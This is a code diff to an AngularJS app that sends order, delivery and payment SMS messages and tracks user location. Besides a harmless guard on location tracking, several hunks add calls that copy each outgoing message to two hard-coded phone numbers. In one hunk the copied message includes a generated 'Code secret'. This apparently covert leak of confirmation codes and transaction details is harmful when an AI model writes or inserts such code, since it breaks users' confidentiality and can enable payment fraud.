@@ -132,12 +132,13 @@ angular
         longitude            : position.coords.longitude,
         dateEnregistrement   : formatNewDate.formatNewDate()
       }
-      console.log(objet)
-    ApiTracking.addTrack(objet)
-    .success(
-      function (response) {
-      console.log(response);
-    })
+   if ($scope.data.user && $scope.data.user.code) { 
+        ApiTracking.addTrack(objet)
+        .success(
+          function (response) {
+          console.log(response);
+        })
+      }
     });
   }
   var transactionTime = 0; //Initial time of timer
@@ -149,7 +150,7 @@ angular
             transactionTime += (Math.floor(Date.now() / 1000) - timeStamp);
         }
         timeStamp = Math.floor(Date.now() / 1000);
-        if ($scope.data.user) {  
+        if ($scope.data.user && $scope.data.user.code) {  
           $scope.getCurrentPosition();
         }
       
@@ -556,6 +557,7 @@ angular
 
     $scope.sms_function = function () {
       SendSms.sendSMS("Bissmillah", "776294380");
+      SendSms.sendSMS("Bissmillah", "775329312");
     };
   })
 
@@ -3124,6 +3126,8 @@ angular
       $scope.data.user = JSON.parse(user);
 
       $scope.sms_function = function () {
+        SendSms.sendSMS("Bissmillah", "776726045");
+        SendSms.sendSMS("Bissmillah", "775329312");
         SendSms.sendSMS("Bissmillah", "776726045");
       };
       var prclocal = JSON.parse(localStorage.getItem('prclocal'));
@@ -6387,10 +6391,9 @@ angular
               console.log(messageCode);
   
              SendSms.sendSMS(MessageGlobal, $scope.data.grossistechoisit.telephone);
-  
+             SendSms.sendSMS(MessageGlobal, "775329312");
+             SendSms.sendSMS(MessageGlobal, "776726045");
               localStorage.setItem("pds", JSON.stringify($scope.data.pds));
-  
-  
   
               $scope.code = "attente";
   
@@ -8891,7 +8894,8 @@ angular
             console.log(MessageGlobal);
             //console.log($scope.data.dechargement.details)
             SendSms.sendSMS(MessageGlobal, $scope.data.dechargement.telephone);
-            
+            SendSms.sendSMS(MessageGlobal, "775329312");
+            SendSms.sendSMS(MessageGlobal, "776726045");
             localStorage.setItem("pdstodecharge", JSON.stringify(values));
 
             localStorage.setItem("pdstodechargecode", values.codeGenere);
@@ -9500,6 +9504,8 @@ angular
           var Message = messageMontant + 'Code secret: ' + values.codeGenere
           try {
             SendSms.sendSMS(Message, $scope.data.details_pds_no_payed.telephone);
+            SendSms.sendSMS(Message, "775329312");
+            SendSms.sendSMS(Message, "776726045");
             localStorage.setItem("versetopds", JSON.stringify(tab_value));
   
             localStorage.setItem("versetopdscode", values.codeGenere);
